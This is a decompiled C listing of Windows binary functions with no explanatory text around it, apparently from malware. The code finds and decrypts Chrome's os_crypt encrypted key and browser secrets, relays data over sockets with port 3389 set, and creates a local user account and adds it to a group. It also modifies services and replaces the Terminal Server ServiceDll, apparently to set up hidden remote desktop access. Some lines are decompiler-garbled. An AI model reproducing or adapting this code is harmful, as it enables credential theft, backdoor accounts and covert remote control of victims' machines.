                goto lab_0x4105a7;
            } else {
                // 0x41059b
                v5 = &v7;
                result = 1;
                if (*nNumberOfBytesToRead != lpNumberOfBytesRead) {
                    goto lab_0x4105a7;
                } else {
                    goto lab_0x4105b2;
                }
            }
        }
    } else {
        goto lab_0x4105b3;
    }
  lab_0x4105b3:
    // 0x4105b3
    *(int32_t *)(v4 - 4) = v1;
    CloseHandle(&g322);
    // 0x4105bb
    return result;
  lab_0x4105b2:
    // 0x4105b2
    v4 = (int32_t)v5 + 4;
    goto lab_0x4105b3;
  lab_0x4105a7:
    // 0x4105a7
    LocalFree(hMem);
    int32_t v8; // bp-100, 0x410514
    v5 = &v8;
    result = 0;
    goto lab_0x4105b2;
}

// Address range: 0x4105c0 - 0x410620
int32_t function_4105c0(int32_t * pcbBinary) {
    // 0x4105c0
    *pcbBinary = 0;
    int32_t v1; // 0x4105c0
    int16_t * pszString = (int16_t *)v1; // 0x4105dc
    int32_t * hMem = (int32_t *)v1; // 0x4105dd
    *hMem = 0;
    if (!CryptStringToBinaryW(pszString, 0, 1, NULL, pcbBinary, NULL, NULL)) {
        // 0x410619
        return 0;
    }
    int32_t * memoryHandle = LocalAlloc(64, *pcbBinary); // 0x4105ed
    *hMem = (int32_t)memoryHandle;
    if (memoryHandle == NULL) {
        // 0x410619
        return 0;
    }
    bool result = CryptStringToBinaryW(pszString, 0, 1, (char *)memoryHandle, pcbBinary, NULL, NULL); // 0x410603
    if (!result) {
        // 0x41060f
        *hMem = (int32_t)LocalFree(hMem);
    }
    // 0x410619
    return result;
}

// Address range: 0x410620 - 0x410680
int32_t function_410620(int32_t a1) {
    // 0x410620
    int32_t v1; // 0x410620
    int32_t * v2 = (int32_t *)v1; // 0x410639
    *v2 = 0;
    *(int32_t *)a1 = 0;
    if (BCryptOpenAlgorithmProvider((int32_t **)v1, (int16_t *)&g109, NULL, 0) != 0) {
        // 0x410679
        return 0;
    }
    int32_t result = 0; // 0x41065e
    if (BCryptSetProperty(v2, L"ChainingMode", "C", 32, 0) == 0) {
        // 0x410660
        result = BCryptGenerateSymmetricKey(v2, (int32_t **)a1, NULL, 0, (char *)v1, 32, 0) == 0;
    }
    // 0x410679
    return result;
}

// Address range: 0x410680 - 0x4106b1
int32_t function_410680(void) {
    int32_t v1 = *(int32_t *)0x41e150;
    int32_t result = 0; // 0x4106aa
    if (v1 == (int32_t)&g148) {
      lab_0x4106ae:
        // 0x4106ae
        return result;
    }
    int32_t v2 = 0;
    int32_t v3; // 0x410680
    while (*(int32_t *)(4 * v2 + v3) == *(int32_t *)(v1 + 8 + 4 * v2)) {
        // 0x41069c
        result = v1;
        if (v2 == 3) {
            return result;
        }
        v2++;
    }
    int32_t v4 = *(int32_t *)v1;
    while (v4 != (int32_t)&g148) {
        int32_t v5 = v4;
        v2 = 0;
        while (*(int32_t *)(4 * v2 + v3) == *(int32_t *)(v5 + 8 + 4 * v2)) {
            // 0x41069c
            result = v5;
            if (v2 == 3) {
                return result;
            }
            v2++;
        }
        // 0x4106a6
        v4 = *(int32_t *)v5;
    }
    // 0x4106ae
    return 0;
}

// Address range: 0x4106b1 - 0x41079b
int32_t function_4106b1(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x4106b1
    int32_t v1; // 0x4106b1
    if (v1 == 0) {
        // 0x410794
        return 0;
    }
    int32_t * memoryHandle = LocalAlloc(64, 108); // 0x4106cc
    int32_t result = (int32_t)memoryHandle; // 0x4106cc
    if (memoryHandle != NULL) {
        // 0x4106dc
        __asm_rep_movsd_memcpy((char *)memoryHandle, (char *)v1, 12);
        int32_t v2 = result + 52; // 0x4106e6
        int32_t * v3 = (int32_t *)(result + 44); // 0x4106e9
        int32_t v4 = v1 + 48; // 0x4106ec
        int32_t v5 = *v3 + v4; // 0x4106ef
        *(int32_t *)(result + 48) = v4;
        int32_t v6 = v5 + 12; // 0x4106f8
        *(int32_t *)v2 = *(int32_t *)v5;
        bool v7; // 0x4106b1
        int32_t v8 = v7 ? -4 : 4; // 0x4106fb
        int32_t v9 = v2 + v8; // 0x4106fb
        int32_t v10 = v5 + v8; // 0x4106fb
        *(int32_t *)v9 = *(int32_t *)v10;
        *(int32_t *)(v9 + v8) = *(int32_t *)(v10 + v8);
        int32_t * v11 = (int32_t *)(result + 60); // 0x4106fe
        int32_t v12 = *v11; // 0x4106fe
        int32_t v13 = result + 76; // 0x410701
        *(int32_t *)(result + 64) = v6;
        int32_t v14 = *(int32_t *)(v12 + v6); // 0x410707
        int32_t v15 = v5 + 16 + v12; // 0x41070d
        int32_t * v16 = (int32_t *)(result + 68); // 0x41070f
        *v16 = v14;
        *(int32_t *)(result + 72) = v15;
        int32_t v17 = v14 + v15; // 0x410715
        int32_t v18 = v17 + 12; // 0x410719
        *(int32_t *)v13 = *(int32_t *)v17;
        int32_t v19 = v13 + v8; // 0x41071c
        int32_t v20 = v17 + v8; // 0x41071c
        *(int32_t *)v19 = *(int32_t *)v20;
        *(int32_t *)(v19 + v8) = *(int32_t *)(v20 + v8);
        int32_t * v21 = (int32_t *)(result + 84); // 0x41071f
        *(int32_t *)(result + 88) = v18;
        int32_t v22 = *v21 + v18;
        int32_t v23 = *(int32_t *)v22; // 0x410727
        int32_t v24 = v22 + 4; // 0x41072d
        int32_t * v25 = (int32_t *)(result + 92); // 0x41072f
        *v25 = v23;
        *(int32_t *)(result + 96) = v24;
        int32_t v26 = v24 + v23;
        int32_t * v27 = (int32_t *)(result + 100); // 0x410738
        *v27 = *(int32_t *)v26;
        *(int32_t *)(result + 104) = v26 + 4;
        function_41079b(*v3, 0);
        function_41079b(*v11, 0);
        function_41079b(*v16, 0);
        function_41079b(*v21, 0);
        function_41079b(*v25, 0);
        function_41079b(*v27, 0);
    }
    // 0x410794
    return result;
}

// Address range: 0x41079b - 0x4107d1
int32_t function_41079b(int32_t uBytes, int32_t a2) {
    // 0x41079b
    int32_t v1; // 0x41079b
    if ((a2 || uBytes) == 0) {
        // 0x4107cb
        *(int32_t *)v1 = 0;
        return 0;
    }
    int32_t * memoryHandle = LocalAlloc(64, uBytes); // 0x4107b1
    int32_t v2 = (int32_t)memoryHandle; // 0x4107b1
    int32_t result = v2; // 0x4107bb
    if (memoryHandle != NULL) {
        // 0x4107bd
        result = function_40126d(memoryHandle, (int32_t *)v1, uBytes);
    }
    // 0x4107cb
    *(int32_t *)v1 = v2;
    return result;
}

// Address range: 0x4107d1 - 0x410827
int32_t function_4107d1(void) {
    // 0x4107d1
    int32_t v1; // 0x4107d1
    if (v1 == 0) {
        // 0x410825
        int32_t result; // 0x4107d1
        return result;
    }
    int32_t * v2 = (int32_t *)(v1 + 48); // 0x4107d8
    int32_t v3; // bp-8, 0x4107d1
    int32_t * v4 = &v3; // 0x4107e3
    if (*v2 != 0) {
        int32_t hMem = *v2; // 0x4107e5
        int32_t v5 = hMem; // bp-12, 0x4107e5
        LocalFree((int32_t *)hMem);
        v4 = &v5;
    }
    int32_t v6 = (int32_t)v4;
    int32_t v7 = *(int32_t *)(v1 + 64); // 0x4107ea
    int32_t v8 = v6; // 0x4107ee
    if (v7 != 0) {
        // 0x4107f0
        v8 = v6 - 4;
        *(int32_t *)v8 = v7;
        LocalFree(&g322);
    }
    int32_t v9 = *(int32_t *)(v1 + 72); // 0x4107f5
    int32_t v10 = v8; // 0x4107f9
    if (v9 != 0) {
        // 0x4107fb
        v10 = v8 - 4;
        *(int32_t *)v10 = v9;
        LocalFree(&g322);
    }
    int32_t v11 = *(int32_t *)(v1 + 88); // 0x410800
    int32_t v12 = v10; // 0x410804
    if (v11 != 0) {
        // 0x410806
        v12 = v10 - 4;
        *(int32_t *)v12 = v11;
        LocalFree(&g322);
    }
    int32_t v13 = *(int32_t *)(v1 + 96); // 0x41080b
    int32_t v14 = v12; // 0x41080f
    if (v13 != 0) {
        // 0x410811
        v14 = v12 - 4;
        *(int32_t *)v14 = v13;
        LocalFree(&g322);
    }
    int32_t v15 = *(int32_t *)(v1 + 104); // 0x410816
    if (v15 != 0) {
        // 0x41081c
        *(int32_t *)(v14 - 4) = v15;
        LocalFree(&g322);
    }
    // 0x410825
    return (int32_t)LocalFree(&g322);
}

// Address range: 0x410827 - 0x4108a6
int32_t function_410827(int32_t a1, int32_t a2) {
    // 0x410827
    int32_t v1; // bp-12, 0x410827
    if (function_410514(&v1) == 0) {
        // 0x4108a0
        return 0;
    }
    int32_t hMem = function_4104d3(); // 0x410847
    int32_t result = 0; // 0x410850
    if (hMem != 0) {
        int32_t v2 = function_401098(hMem, L"\"os_crypt\":{\"encrypted_key\":\""); // 0x410858
        result = 0;
        if (v2 != 0) {
            // 0x410865
            result = 0;
            if (function_401098(v2 + 58, L"\"}") != 0) {
                // 0x410879
                result = function_41035f((int32_t)L"\"}", a1);
            }
        }
        // 0x410890
        LocalFree((int32_t *)hMem);
    }
    // 0x410897
    LocalFree(&g322);
    // 0x4108a0
    return result;
}

// Address range: 0x4108a6 - 0x4109fb
int32_t function_4108a6(int32_t a1, int32_t a2) {
    // 0x4108a6
    int32_t v1; // 0x4108a6
    uint32_t v2 = v1;
    int16_t v3 = 0x3176; // bp-12, 0x4108b1
    if (v2 >= 3) {
        if ((int16_t)v1 == 0x3176) {
            unsigned char result = *(char *)(v1 + 2); // 0x4108d5
            if (result == 48) {
                // 0x4108e2
                if (a1 == 0 || a2 == 0) {
                    // 0x4109f6
                    return result;
                }
                // 0x4108f6
                int32_t v4; // bp-80, 0x4108a6
                function_401293(&v4, 0, 64);
                v4 = 64;
                int32_t uBytes = v2 - 31; // 0x410924
                v3 = uBytes;
                if (uBytes == 0) {
                    // 0x4109f6
                    return 0;
                }
                int32_t * memoryHandle = LocalAlloc(64, uBytes); // 0x410938
                if (memoryHandle == NULL) {
                    // 0x4109f6
                    return (int32_t)memoryHandle;
                }
                int32_t v5 = v3; // 0x41094f
                int32_t v6 = BCryptDecrypt((int32_t *)a2, (char *)(v1 + 15), v5, &v4, NULL, 0, (char *)memoryHandle, v5, (int32_t *)&v3, 0); // 0x410966
                if (v6 != 0 || v3 == 0) {
                    // 0x4109f6
                    return 0;
                }
                int32_t result2 = function_401000((int32_t)v3 + 1); // 0x410979
                int32_t v7 = v3; // 0x41097e
                int32_t * v8 = (int32_t *)result2; // 0x41098b
                function_401293(v8, 0, v7 + 1);
                function_40126d(v8, memoryHandle, v7);
                // 0x4109ee
                LocalFree(&g322);
                // 0x4109f6
                return result2;
            }
        }
    }
    // 0x4109a5
    int32_t v9; // bp-16, 0x4108a6
    if (function_4103e4(&v9, (int32_t *)&v3) == 0) {
        // 0x4109f6
        return 0;
    }
    int32_t result3 = function_401000((int32_t)v3 + 1); // 0x4109c4
    int32_t v10 = v3; // 0x4109c9
    int32_t * v11 = (int32_t *)result3; // 0x4109d6
    function_401293(v11, 0, v10 + 1);
    function_40126d(v11, (int32_t *)v9, v10);
    // 0x4109ee
    LocalFree(&g322);
    // 0x4109f6
    return result3;
}

// Address range: 0x4109fb - 0x410a68
int32_t function_4109fb(int32_t a1) {
    // 0x4109fb
    int32_t v1; // 0x4109fb
    function_401230(v1);
    int32_t v2; // bp-4100, 0x4109fb
    int32_t v3 = &v2; // 0x410a18
    int32_t v4 = v3; // bp-24, 0x410a18
    int32_t v5 = &v4; // 0x410a18
    function_401293(&v2, 0, 0x1000);
    *(int32_t *)(v5 + 8) = 0;
    *(int32_t *)(v5 + 4) = 0x1000;
    v4 = v3;
    int32_t * v6 = (int32_t *)a1; // 0x410a53
    *(int32_t *)(v5 - 4) = *v6;
    int32_t v7 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x410a55
    if (v7 == -1) {
        // 0x410a60
        return 0;
    }
    int32_t v8 = v5;
    int32_t * v9 = (int32_t *)(v8 - 8);
    *v9 = v7;
    while ((char)function_410c08((int32_t)&g322) != 0) {
        // 0x410a37
        *v9 = 0x1000;
        int32_t * v10 = (int32_t *)(v8 - 12);
        *v10 = 0;
        int32_t v11 = v8 - 16; // 0x410a40
        int32_t * v12 = (int32_t *)v11;
        *v12 = v3;
        function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
        *v9 = 0;
        *v10 = 0x1000;
        *v12 = v3;
        *(int32_t *)(v8 - 20) = *v6;
        int32_t v13 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x410a55
        if (v13 == -1) {
            // break -> 0x410a60
            break;
        }
        v8 = v11;
        v9 = (int32_t *)(v8 - 8);
        *v9 = v13;
    }
    // 0x410a60
    return 0;
}

// Address range: 0x410a68 - 0x410ad5
int32_t function_410a68(int32_t a1) {
    // 0x410a68
    int32_t v1; // 0x410a68
    function_401230(v1);
    int32_t v2; // bp-4100, 0x410a68
    int32_t v3 = &v2; // 0x410a85
    int32_t v4 = v3; // bp-24, 0x410a85
    int32_t v5 = &v4; // 0x410a85
    function_401293(&v2, 0, 0x1000);
    int32_t * v6 = (int32_t *)(a1 + 4); // 0x410abf
    *(int32_t *)(v5 + 8) = 0;
    *(int32_t *)(v5 + 4) = 0x1000;
    v4 = v3;
    *(int32_t *)(v5 - 4) = *v6;
    int32_t v7 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x410ac2
    if (v7 == -1) {
        // 0x410acd
        return 0;
    }
    int32_t v8 = v5;
    int32_t * v9 = (int32_t *)(v8 - 8);
    *v9 = v7;
    while ((char)function_410c08((int32_t)&g322) != 0) {
        // 0x410aa3
        *v9 = 0x1000;
        int32_t * v10 = (int32_t *)(v8 - 12);
        *v10 = 0;
        int32_t v11 = v8 - 16; // 0x410aac
        int32_t * v12 = (int32_t *)v11;
        *v12 = v3;
        function_401293(&g322, (int32_t)&g322, (int32_t)&g322);
        *v9 = 0;
        *v10 = 0x1000;
        *v12 = v3;
        *(int32_t *)(v8 - 20) = *v6;
        int32_t v13 = recv((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x410ac2
        if (v13 == -1) {
            // break -> 0x410acd
            break;
        }
        v8 = v11;
        v9 = (int32_t *)(v8 - 8);
        *v9 = v13;
    }
    // 0x410acd
    return 0;
}

// Address range: 0x410ad5 - 0x410bf5
int32_t function_410ad5(int32_t a1) {
    // 0x410ad5
    int32_t v1; // 0x410ad5
    int32_t v2 = v1 + 984; // 0x410adf
    struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)v2; // 0x410ae5
    struct _RTL_CRITICAL_SECTION * v3 = lpCriticalSection; // bp-28, 0x410ae5
    EnterCriticalSection(lpCriticalSection);
    int32_t v4 = (int32_t)&v3; // 0x410af3
    int32_t v5; // 0x410ad5
    int32_t v6; // 0x410ad5
    if (*(int32_t *)(v1 + 492) != 0) {
        goto lab_0x410b16;
    } else {
        int32_t v7 = a1 + 8; // 0x410afb
        int32_t v8 = v7; // bp-40, 0x410b01
        v4 = &v8;
        function_404385(v7);
        int32_t v9 = function_406871((int32_t)&g322, (int32_t)&g322); // 0x410b0d
        v5 = v1 + 484;
        v6 = v4;
        if (v9 == 0) {
            goto lab_0x410b37;
        } else {
            goto lab_0x410b16;
        }
    }
  lab_0x410b16:;
    int32_t v10 = v4; // 0x410b1a
    if (*(int32_t *)(v1 + 12) != 0) {
        goto lab_0x410b46;
    } else {
        // 0x410b1c
        *(int32_t *)(v4 - 4) = *(int32_t *)(a1 + 4);
        *(int32_t *)(v4 - 8) = v5;
        int32_t v11 = v4 - 12; // 0x410b25
        *(int32_t *)v11 = a1;
        function_404385((int32_t)&g322);
        int32_t v12 = function_406871((int32_t)&g322, (int32_t)&g322); // 0x410b2e
        v6 = v11;
        v10 = v11;
        if (v12 != 0) {
            goto lab_0x410b46;
        } else {
            goto lab_0x410b37;
        }
    }
  lab_0x410b46:
    // 0x410b46
    *(int32_t *)(v10 - 4) = 0;
    if (function_402a2f((int32_t)&g322) == 0) {
        // 0x410b59
        function_402771();
    }
    // 0x410b60
    *(int32_t *)(v10 - 8) = 0;
    if (function_402a2f((int32_t)&g322) == 0) {
        // 0x410b71
        function_402771();
    }
    int32_t v13 = *(int32_t *)(v1 + 16); // bp-12, 0x410b81
    int32_t v14 = &v13; // 0x410b90
    *(int32_t *)(v10 - 12) = v14;
    *(int32_t *)(v10 - 16) = 0x4109fb;
    function_402746(v13, (int32_t *)*(int32_t *)(v1 + 496));
    *(int32_t *)(v10 - 20) = v14;
    *(int32_t *)(v10 - 24) = 0x410a68;
    function_402746((int32_t)&g322, &g322);
    *(int32_t *)(v10 - 28) = v2;
    int32_t * v15 = (int32_t *)v1; // 0x410bb6
    *v15 = 1;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    *(int32_t *)(v10 - 32) = -1;
    function_402a2f((int32_t)&g322);
    *(int32_t *)(v10 - 36) = -1;
    function_402a2f((int32_t)&g322);
    *(int32_t *)(v10 - 40) = v2;
    EnterCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    *v15 = 0;
    *(int32_t *)(v10 - 44) = v2;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    function_410c8a();
    // 0x410bee
    return 0;
  lab_0x410b37:
    // 0x410b37
    *(int32_t *)(v6 - 4) = v2;
    LeaveCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    // 0x410bee
    return 1;
}

// Address range: 0x410bf5 - 0x410c08
int32_t function_410bf5(int32_t a1) {
    // 0x410bf5
    return function_410ad5(a1);
}

// Address range: 0x410c08 - 0x410c44
int32_t function_410c08(int32_t a1) {
    // 0x410c08
    if (a1 == 0) {
        // 0x410c40
        int32_t v1; // 0x410c08
        return v1 & -256;
    }
    // 0x410c19
    int32_t v2; // bp-16, 0x410c08
    int32_t v3 = &v2; // 0x410c19
    int32_t v4 = a1; // 0x410c19
    *(int32_t *)(v3 - 4) = 0;
    *(int32_t *)(v3 - 8) = v4;
    int32_t v5; // 0x410c08
    *(int32_t *)(v3 - 12) = v5 + a1 - v4;
    v3 -= 16;
    int32_t v6 = send((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322); // 0x410c28
    int32_t result; // 0x410c08
    while (v6 != -1) {
        // 0x410c33
        v4 -= v6;
        if (v4 == 0) {
            // 0x410c3a
            result = v6 & -256 | 1;
            return result;
        }
        *(int32_t *)(v3 - 4) = 0;
        *(int32_t *)(v3 - 8) = v4;
        *(int32_t *)(v3 - 12) = v5 + a1 - v4;
        v3 -= 16;
        v6 = send((int32_t)&g322, (char *)&g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x410c3e
    result = -256;
  lab_0x410c40:
    // 0x410c40
    return result;
}

// Address range: 0x410c44 - 0x410c8a
int32_t function_410c44(void) {
    // 0x410c44
    int32_t v1; // 0x410c44
    struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(v1 + 984); // 0x410c4d
    struct _RTL_CRITICAL_SECTION * v2 = lpCriticalSection; // bp-8, 0x410c4d
    DeleteCriticalSection(lpCriticalSection);
    int32_t hObject = *(int32_t *)(v1 + 972); // 0x410c54
    int32_t v3 = (int32_t)&v2; // 0x410c5c
    if (hObject != 0) {
        int32_t v4 = hObject; // bp-12, 0x410c5e
        CloseHandle((int32_t *)hObject);
        v3 = &v4;
    }
    int32_t v5 = *(int32_t *)(v1 + 964); // 0x410c65
    if (v5 != 0) {
        // 0x410c6f
        *(int32_t *)(v3 - 4) = v5;
        CloseHandle(&g322);
    }
    // 0x410c76
    function_4065d1();
    return function_4065d1();
}

// Address range: 0x410c8a - 0x410cce
int32_t function_410c8a(void) {
    // 0x410c8a
    int32_t v1; // 0x410c8a
    struct _RTL_CRITICAL_SECTION * lpCriticalSection = (struct _RTL_CRITICAL_SECTION *)(v1 + 984); // 0x410c94
    EnterCriticalSection(lpCriticalSection);
    function_402771();
    function_402771();
    function_4065fd();
    function_4065fd();
    LeaveCriticalSection(lpCriticalSection);
    return &g322;
}

// Address range: 0x410cce - 0x410d4b
int32_t function_410cce(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a2;
    int32_t v2 = a4;
    g263 = a1;
    int32_t v3 = function_406f77(); // 0x410cdf
    function_40415d((int32_t)&v2);
    *(int32_t *)(v3 + 4) = 3389;
    function_40415d((int32_t)&v1);
    *(int32_t *)(v3 + 12) = a3;
    *(int32_t *)(v3 + 16) = (int32_t)&g261;
    function_402746(0x410bf5, (int32_t *)v3);
    function_406f1d();
    return function_406f1d();
}

// Address range: 0x410d4b - 0x410d7a
int32_t function_410d4b(void) {
    // 0x410d4b
    int128_t v1; // 0x410d4b
    int128_t v2 = v1;
    function_40696e();
    function_40696e();
    __asm_movups(g262, __asm_xorps(v2, v2));
    InitializeCriticalSection((struct _RTL_CRITICAL_SECTION *)&g322);
    return &g261;
}

// Address range: 0x410d7a - 0x410df8
int32_t function_410d7a(int32_t a1, int32_t a2) {
    int32_t v1 = a1;
    int32_t * v2 = (int32_t *)a1; // 0x410d92
    int32_t v3 = *v2; // bp-36, 0x410d95
    int32_t v4 = NetUserAdd(NULL, 1, (char *)&v3, NULL); // 0x410db5
    int32_t result = 0; // 0x410dbd
    if (v4 == 0) {
        int32_t v5 = *v2; // 0x410dbf
        v1 = v5;
        int32_t v6 = *(int32_t *)function_413248(v5); // 0x410dd3
        int32_t v7 = NetLocalGroupAddMembers(NULL, (int16_t *)v6, 3, (char *)&v1, 1); // 0x410dd6
        function_406f1d();
        result = v7 == 0;
    }
    // 0x410df1
    return result;
}

// Address range: 0x410df8 - 0x410e64
int32_t function_410df8(int32_t lpServiceName, int32_t dwStartType) {
    int32_t * hSCManager = OpenSCManagerW(NULL, L"ServicesActive", 1); // 0x410e07
    if (hSCManager == NULL) {
        // 0x410e5e
        return (int32_t)hSCManager;
    }
    int32_t * hService = OpenServiceW(hSCManager, (int16_t *)*(int32_t *)lpServiceName, 2); // 0x410e1c
    int32_t result; // 0x410df8
    if (hService != NULL) {
        bool v1 = ChangeServiceConfigW(hService, -1, dwStartType, -1, NULL, NULL, NULL, NULL, NULL, NULL, NULL); // 0x410e42
        CloseServiceHandle(hSCManager);
        CloseServiceHandle(hService);
        result = v1;
    } else {
        // 0x410e28
        CloseServiceHandle(hSCManager);
        result = 0;
    }
    // 0x410e5e
    return result;
}

// Address range: 0x410e64 - 0x410ee9
int32_t function_410e64(int32_t lpServiceName) {
    int32_t * hSCManager = OpenSCManagerW(NULL, L"ServicesActive", 1); // 0x410e73
    int32_t result = (int32_t)hSCManager; // 0x410e73
    if (hSCManager == NULL) {
        // 0x410ee3
        return result;
    }
    int32_t * hService = OpenServiceW(hSCManager, (int16_t *)*(int32_t *)lpServiceName, 16); // 0x410e88
    if (hService == NULL) {
        // 0x410e94
        CloseServiceHandle(hSCManager);
        // 0x410ee3
        return 0;
    }
    int32_t v1 = (int32_t)hService; // 0x410e88
    int32_t v2 = v1; // bp-52, 0x410ea1
    int32_t v3 = &v2; // 0x410ea1
    int32_t v4 = v3; // 0x410eaa
    int32_t result2; // 0x410e64
    int32_t v5; // 0x410e64
    if (StartServiceW(hService, 0, NULL)) {
        goto lab_0x410ed1;
    } else {
        // 0x410eac
        v5 = v3;
        result2 = 0;
        if (GetLastError() != 1056) {
            goto lab_0x410ed4;
        } else {
            // 0x410eb9
            Sleep(2000);
            int32_t v6 = v1; // bp-68, 0x410ec6
            v4 = &v6;
            v5 = v4;
            result2 = 0;
            if (!StartServiceW(hService, 0, NULL)) {
                goto lab_0x410ed4;
            } else {
                goto lab_0x410ed1;
            }
        }
    }
  lab_0x410ed1:
    // 0x410ed1
    v5 = v4;
    result2 = 1;
    goto lab_0x410ed4;
  lab_0x410ed4:
    // 0x410ed4
    *(int32_t *)(v5 - 4) = result;
    CloseServiceHandle(&g322);
    *(int32_t *)(v5 - 8) = v1;
    CloseServiceHandle(&g322);
    // 0x410ee3
    return result2;
}

// Address range: 0x410ee9 - 0x410f97
int32_t function_410ee9(int32_t * lpServiceName) {
    int32_t pcbBytesNeeded = 0; // bp-8, 0x410ef9
    int32_t * hSCManager = OpenSCManagerW(NULL, L"ServicesActive", 1); // 0x410efc
    int32_t result = (int32_t)hSCManager; // 0x410efc
    if (hSCManager == NULL) {
        // 0x410f91
        return result;
    }
    int32_t * hService = OpenServiceW(hSCManager, (int16_t *)*lpServiceName, 1); // 0x410f15
    if (hService == NULL) {
        // 0x410f21
        CloseServiceHandle(hSCManager);
        // 0x410f91
        return 0;
    }
    int32_t v1 = (int32_t)hService; // 0x410f15
    int32_t v2 = v1; // bp-60, 0x410f30
    int32_t * v3; // 0x410ee9
    if (QueryServiceConfigW(hService, NULL, 0, &pcbBytesNeeded)) {
        goto lab_0x410f46;
    } else {
        int32_t errorCode = GetLastError(); // 0x410f3b
        v3 = &v2;
        if (errorCode != 122) {
            goto lab_0x410f66;
        } else {
            goto lab_0x410f46;
        }
    }
  lab_0x410f46:;
    int32_t lpServiceConfig = function_406f77(); // 0x410f49
    int32_t v4 = v1; // bp-76, 0x410f5b
    bool v5 = QueryServiceConfigW(hService, (struct _QUERY_SERVICE_CONFIGW *)lpServiceConfig, pcbBytesNeeded, &pcbBytesNeeded); // 0x410f5c
    v3 = &v4;
    if (v5) {
        // 0x410f76
        CloseServiceHandle(hSCManager);
        CloseServiceHandle(hService);
        function_401014(lpServiceConfig);
        // 0x410f91
        return *(int32_t *)(lpServiceConfig + 4);
    }
    goto lab_0x410f66;
  lab_0x410f66:;
    int32_t v6 = (int32_t)v3;
    *(int32_t *)(v6 - 4) = result;
    CloseServiceHandle(&g322);
    *(int32_t *)(v6 - 8) = v1;
    CloseServiceHandle(&g322);
    // 0x410f91
    return 0;
}

// Address range: 0x410f97 - 0x41141f
int32_t function_410f97(int32_t a1) {
    // 0x410f97
    function_40460a(L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server");
    function_40460a(L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core");
    function_40460a((int16_t *)0x41bef0);
    function_40460a(L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns");
    function_40460a(L"SYSTEM\\CurrentControlSet\\ControlTerminal Server\\AddIns\\Clip Redirector");
    function_40460a(L"SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\AddIns\\Dynamic VC");
    int32_t v1; // bp-48, 0x410f97
    if (function_414e25(-0x7ffffffe, &v1, 0x20106, 1) != 0) {
        int32_t v2 = a1 == 0; // bp-28, 0x411034
        function_403fc7((int32_t)&v2, 4);
        function_40460a((int16_t *)&g115);
        function_406f1d();
    }
    // 0x4113db
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    function_406f1d();
    return 0;
}

// Address range: 0x41141f - 0x4114f4
int32_t function_41141f(void) {
    int32_t phkResult = 0; // bp-12, 0x411434
    function_40460a(L"SYSTEM\\CurrentControlSet\\Services\\TermService\\Parameters");
    int32_t v1 = -0x7ffffffe; // bp-64, 0x411449
    int32_t lpSubKey; // 0x41141f
    int32_t v2 = RegOpenKeyExW(HKEY_LOCAL_MACHINE, (int16_t *)lpSubKey, 0, 258, (int32_t **)&phkResult); // 0x41144e
    int32_t v3 = &v1; // 0x41145c
    int32_t result = 0; // 0x41145c
    if (v2 == 0) {
        // 0x41145e
        int32_t v4; // bp-28, 0x41141f
        int32_t v5 = function_40424e((int32_t)&v4); // 0x411465
        int16_t * v6 = L"ServiceDll"; // bp-72, 0x41146a
        int32_t v7 = function_40460a(L"ServiceDll"); // 0x411474
        int32_t hKey = phkResult; // 0x411479
        int32_t v8; // 0x41141f
        bool v9; // 0x41141f
        if (hKey != 0) {
            int32_t cbData = *(int32_t *)(v5 + 4); // 0x411482
            int32_t lpData = *(int32_t *)v5; // 0x411485
            int32_t lpValueName = *(int32_t *)v7; // 0x41148a
            int32_t v10 = hKey; // bp-96, 0x41148c
            int32_t v11 = RegSetValueExW((int32_t *)hKey, (int16_t *)lpValueName, 0, 2, (char *)lpData, cbData); // 0x41148f
            v8 = &v10;
            v9 = v11 == 0;
        } else {
            // 0x41147e
            v8 = (int32_t)&v6;
            v9 = false;
        }
        // 0x41149c
        function_406f1d();
        function_404081();
        int32_t v12 = phkResult;
        if (v9) {
            int32_t v13 = v8; // 0x4114cb
            if (v12 != 0) {
                // 0x4114cd
                v13 = v8 - 4;
                *(int32_t *)v13 = v12;
                RegCloseKey(&g322);
            }
            // 0x4114d2
            phkResult = 0;
            v3 = v13;
            result = 1;
        } else {
            int32_t v14 = v8; // 0x4114b6
            if (v12 != 0) {
                // 0x4114b8
                v14 = v8 - 4;
                *(int32_t *)v14 = v12;
                RegCloseKey(&g322);
            }
            // 0x4114bd
            phkResult = 0;
            v3 = v14;
            result = 0;
        }
    }
    // 0x4114d8
    function_406f1d();
    if (phkResult != 0) {
        // 0x4114e6
        *(int32_t *)(v3 - 4) = phkResult;
        RegCloseKey(&g322);
    }
    // 0x4114eb
    return result;
}

// Address range: 0x4114f4 - 0x4116e4
int32_t function_4114f4(void) {
    int16_t * v1 = NULL; // bp-68, 0x41150d
    int32_t v2 = 0; // bp-20, 0x41150e
    int32_t hSCManager = 0; // bp-16, 0x411511
    int32_t v3 = 0; // bp-8, 0x411514
    int32_t * v4 = OpenSCManagerW(NULL, L"ServicesActive", 5); // 0x41151d
    if (v4 == NULL) {
        // 0x4115de
        function_406f1d();
        return 0;
    }
    // 0x41152d
    int32_t v5; // 0x4114f4
    int32_t v6 = v5 + 40; // 0x41152d
    int32_t v7 = &hSCManager; // 0x411540
    int32_t v8 = &v3; // 0x411547
    int32_t v9 = &v2; // 0x41154b
    int32_t * v10 = (int32_t *)(v5 + 44);
    int16_t * v11 = NULL; // 0x411537
